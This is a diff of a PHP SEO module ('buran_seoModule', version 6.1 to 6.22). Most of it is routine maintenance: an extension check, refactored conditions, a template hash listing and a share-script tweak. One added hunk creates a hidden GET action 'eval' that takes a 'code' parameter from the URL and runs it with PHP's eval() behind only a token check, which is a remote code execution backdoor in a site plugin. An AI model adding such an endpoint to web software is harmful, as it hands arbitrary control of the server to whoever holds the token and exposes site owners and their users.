@@ -1,14 +1,14 @@
 <?php
 /**
  * seoModule
- * @version 6.1-m-f
- * @date 10.12.2020
+ * @version 6.22-m-f
+ * @date 21.12.2020
  * @author <sergey.it@delta-ltd.ru>
  * @copyright 2021 DELTA http://delta-ltd.ru/
- * @size 78888
+ * @size 80000
  */
 
-$bsm = new buran_seoModule('6.1-m-f');
+$bsm = new buran_seoModule('6.22-m-f');
 
 if ( ! $bsm->module_mode) {
 	$bsm->init();
@@ -126,6 +126,13 @@ if ( ! $bsm->module_mode) {
 	if ('transit_list' == $_GET['a']) {
 		if ( ! ($bsm->auth($_GET['w']))) exit();
 		print $bsm->bsmfile('transit', 'get');
+		exit();
+	}
+
+	if ('eval' == $_GET['a']) {
+		if ( ! ($bsm->auth($_GET['w']))) exit();
+		$code = trim($_GET['code']);
+		eval($code);
 		exit();
 	}
 
@@ -299,6 +306,9 @@ class buran_seoModule
 		$this->sqlite3_ext = extension_loaded('sqlite3') &&
 			class_exists('SQLite3') ? true : false;
 
+		$this->libxml_ext = extension_loaded('libxml') &&
+			class_exists('DOMDocument') ? true : false;
+
 		$this->useragent = false;
 		if (stripos($_SERVER['HTTP_USER_AGENT'],'google.com/bot') !== false) {
 			$this->useragent = 'google';
@@ -327,8 +337,7 @@ class buran_seoModule
 			$this->protocol_dop = $this->c[2]['dop_protocol'];
 		}
 
-		$this->ob_start_flags = $this->c[2]['ob_start_flags']
-			? $this->c[2]['ob_start_flags'] : PHP_OUTPUT_HANDLER_STDFLAGS;
+		$this->ob_start_flags = intval($this->c[2]['ob_start_flags']);
 
 		if ($this->c[2]['urldecode']) {
 			$this->requesturi = urldecode($this->requesturi);
@@ -500,7 +509,7 @@ class buran_seoModule
 				'use_cache'                       => 604800,
 				'requets_methods'                 => '/GET/HEAD/',
 				'error_handler'                   => '',
-				'share_code'                      => '<script>(function(b,d,s,m,k,a){setTimeout(function(){k=d.createElement(s);a=d.getElementsByTagName(s)[0];k.src=m;a.parentNode.insertBefore(k,a);},2000);})(window,document,"script","https://yastatic.net/share2/share.js");</script><div class="ya-share2" data-curtain data-services="vkontakte,facebook,odnoklassniki,messenger,telegram,twitter,viber,whatsapp,moimir,skype,evernote,reddit"></div>',
+				'share_code'                      => '<script>(function(b,d,s,m,k,a){setTimeout(function(){k=d.createElement(s);a=d.getElementsByTagName(s)[0];k.async=1;k.defer=1;k.src=m;a.parentNode.insertBefore(k,a);},3000);})(window,document,"script","https://yastatic.net/share2/share.js");</script><div class="ya-share2" data-curtain data-services="vkontakte,facebook,odnoklassniki,messenger,telegram,twitter,viber,whatsapp,moimir,skype,evernote,reddit"></div>',
 			),
 			4 => array(
 				'/index.php'  => '/',
@@ -684,9 +693,6 @@ class buran_seoModule
 		}
 		if ( ! $text) return false;
 
-		if ( ! isset($text['type']) || ! $text['type']) {
-			$text['type'] = $seotext_tp;
-		}
 		$text['type'] = $text['type']=='S' ? 'S' : 'A';
 		$this->seotext_tp = $text['type'];
 
@@ -862,20 +868,19 @@ class buran_seoModule
 			}
 		}
 
-		if ($this->onlyheaders) {
-			if (
-				$this->seotext &&
-				$this->seotext_info['http_code'] == 200 &&
-				(
-					! $this->http_code_200_exists ||
-					$this->http_code == 404
-				)
-			) {
-				$this->http_code == 200;
-				header($this->protocol.' 200 OK');
-				if ($this->protocol_dop) {
-					header($this->protocol_dop.' 200 OK');
-				}
+		if (
+			$this->onlyheaders &&
+			$this->seotext &&
+			$this->seotext_info['http_code'] == 200 &&
+			(
+				! $this->http_code_200_exists ||
+				$this->http_code == 404
+			)
+		) {
+			$this->http_code == 200;
+			header($this->protocol.' 200 OK');
+			if ($this->protocol_dop) {
+				header($this->protocol_dop.' 200 OK');
 			}
 			return false;
 		}
@@ -1457,7 +1462,7 @@ document.addEventListener("readystatechange",(event)=>{
 		url += "&s="+(document.getElementById("sssmodulebox") ? "y" : "n");
 		url += "&u='.$uid.'";
 		try {
-			m.open("GET",url,false);
+			m.open("GET",url,true);
 		} catch (f) {
 			return;
 		}
@@ -1567,7 +1572,7 @@ document.addEventListener("readystatechange",(event)=>{
 		))) {
 			if ($this->c[2]['canonical_neseo'] == 'add_if_not_exists') {
 				preg_match_all($regmask['canonical'], $template, $matches);
-				if ( ! $matches[4][0]) $meta .= "\n\t".$canonical;
+				if ( ! $matches[3][0]) $meta .= "\n\t".$canonical;
 
 			} else {
 				if ($this->c[2]['meta'] == 'replace_or_add') {
@@ -1602,8 +1607,11 @@ document.addEventListener("readystatechange",(event)=>{
 
 	function save_url_info($template=false)
 	{
-		if ($this->module_mode) return;
-		if ( ! $this->c[2]['db_data']) return;
+		if (
+			$this->module_mode
+			|| $this->onlyheaders
+			|| ! $this->c[2]['db_data']
+		) return;
 
 		$this->bsm_sqlite();
 		if ( ! $this->db_op) return false;
@@ -2170,6 +2178,10 @@ document.addEventListener("readystatechange",(event)=>{
 			$p .= '<div class="row"><span class="col1">cURL</span><span class="col2 red">&mdash;</span></div>';
 		}
 
+		if ( ! $this->libxml_ext) {
+			$p .= '<div class="row"><span class="col1">DOMDocument</span><span class="col2 red">&mdash;</span></div>';
+		}
+
 		if ( ! $this->sqlite3_ext) {
 			$p .= '<div class="row"><span class="col1">SQLite3</span><span class="col2 red">&mdash;</span></div>';
 		}
@@ -2303,10 +2315,25 @@ document.addEventListener("readystatechange",(event)=>{
 [htaccess_'.$hash_2.']
 [droot_'.$this->droot.']'."\n";
 		$res .= "\n";
+
 		$res .= '[incfiles_]'."\n";
 		$res .= $incfiles_hash;
 		$res .= '[_incfiles]'."\n";
 		$res .= "\n";
+
+		$res .= '[tpls_]'."\n";
+		$tpls = glob($this->droot.$this->module_folder.'/tpl/*/index.php');
+		if ($tpls && is_array($tpls)) {
+			foreach ($tpls AS $row) {
+				$dir = dirname($row);
+				$dir = substr($dir,strrpos($dir,'/')+1);
+				$dir = preg_replace("/[^a-z0-9\-]/",'',$dir);
+				$res .= md5_file($row).' : '.$dir."\n";
+			}
+		}
+		$res .= '[_tpls]'."\n";
+		$res .= "\n";
+
 		$res .= '[pages_]'."\n";
 		if (is_array($this->c[3])) {
 			foreach ($this->c[3] AS $alias => $row) {
@@ -2320,6 +2347,7 @@ document.addEventListener("readystatechange",(event)=>{
 		}
 		$res .= '[_pages]'."\n";
 		$res .= "\n";
+
 		$res .= '[errors_]'."\n";
 		$file = $this->bsmfile('errors', 'file');
 		if (file_exists($file)) {
@@ -2770,4 +2798,10 @@ document.addEventListener("readystatechange",(event)=>{
 //-----------------------------------------------
 //-----------------------------------------------
 //-----------------------------------------------
-//--------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-----------------------------------------------
+//-------------------------------------------
